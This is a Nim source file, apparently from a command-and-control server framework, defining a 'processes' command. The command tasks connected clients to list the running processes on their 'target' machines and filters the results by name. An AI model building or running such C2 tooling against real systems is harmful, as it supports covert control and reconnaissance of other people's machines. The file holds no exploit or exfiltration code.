import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("processes")
    if not task.isNil(): 
      await task.awaitResponse()
      let processesJson = parseJson(task.output.data)
      var processes: seq[tuple[name: string, id: int]]
      
      for pJson in processesJson:
        let name = pJson["name"].getStr("-")
        let id = pJson["id"].getInt(0)
        if args.len > 0: 
          if not ( args[0].toLowerAscii() in name.toLowerAscii() ): continue
        processes.add (name: name, id: id)

      if processes.len == 0:
        infoLog "no processes found with name"
        return
      
      printTable(toJson processes)

let cmd*: Command = Command(
  execProc: execProc,
  name: "processes",
  argsLength: 0,
  aliases: @["ps"],
  usage: @["processes [optional, search image name]"],
  cliMode: @[ClientInteractMode],
  description: "List processes on target",
  category: CCClientInteraction,
  requiresConnectedClient: true
)